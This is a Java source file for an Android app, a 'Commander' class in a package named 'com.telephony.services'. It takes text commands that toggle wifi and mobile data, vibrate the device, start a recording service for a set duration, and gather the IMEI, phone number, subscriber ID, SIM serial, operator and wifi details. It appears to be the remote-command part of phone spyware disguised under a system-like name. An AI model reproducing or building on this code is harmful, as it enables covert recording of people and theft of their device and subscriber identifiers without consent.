package com.telephony.services;

import java.lang.ref.WeakReference;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidKeyException;
import java.util.HashMap;
import java.util.Map;

import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Vibrator;
import android.telephony.TelephonyManager;

public class Commander {
	private WeakReference<Context> wContext = null;

	public Commander(Context context) {
		wContext = new WeakReference<Context>(context);
	}

	public Map<String, String> exec(String cmd) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException,
			IllegalArgumentException, NoSuchMethodException, InvocationTargetException, InvalidKeyException {

		Map<String, String> res = new HashMap<String, String>();
		String[] params;

		params = cmd.split(" +");
		if (params.length > 0) {
			if ("wifi".equals(params[0])) {
				if (params.length > 1) {
					boolean enabled = Boolean.parseBoolean(params[1]);
					WifiManager wm = (WifiManager) wContext.get().getSystemService(Context.WIFI_SERVICE);
					wm.setWifiEnabled(enabled);
				}
			} else if ("mobile".equals(params[0])) {
				if (params.length > 1) {
					boolean enabled = Boolean.parseBoolean(params[1]);
					Utils.setMobileDataEnabled(wContext.get(), enabled);
				}
			} else if ("rec".equals(params[0])) {
				if (params.length > 1) {
					int duration = (int) (Integer.parseInt(params[1]) * Utils.SECOND);
					Intent mi = new Intent(wContext.get(), RecRecordService.class).putExtra(Utils.EXTRA_COMMAND, 1).putExtra(Utils.EXTRA_DURATION,
							duration);
					wContext.get().startService(mi);
				}
			} else if ("vibro".equals(params[0])) {
				if (params.length > 1) {
					int duration = Integer.parseInt(params[1]);
					((Vibrator) wContext.get().getSystemService(Context.VIBRATOR_SERVICE)).vibrate(duration);
				}
			} else if ("info".equals(params[0])) {

				WifiManager wm = (WifiManager) wContext.get().getSystemService(Context.WIFI_SERVICE);
				if (wm.isWifiEnabled()) {
					WifiInfo wi = wm.getConnectionInfo();
					if (wi != null) {
						res.put("wifi_ssid", wi.getSSID());
						res.put("wifi_mac", wi.getMacAddress());
					}
				}
				TelephonyManager tm = (TelephonyManager) wContext.get().getSystemService(Context.TELEPHONY_SERVICE);
				if (tm != null) {
					res.put("mobile_operator", tm.getNetworkOperatorName());
					res.put("mobile_country", tm.getSimCountryIso());
					res.put("mobile_IMEI", tm.getDeviceId());
					res.put("mobile_softwareVersion", tm.getDeviceSoftwareVersion());
					res.put("mobile_phoneNumber", tm.getLine1Number());
					res.put("mobile_subscribeId", tm.getSubscriberId());
					res.put("mobile_simserial", tm.getSimSerialNumber());
				}
			}
		}
		return res;
	}

	public void free() {
		wContext.clear();
	}

}
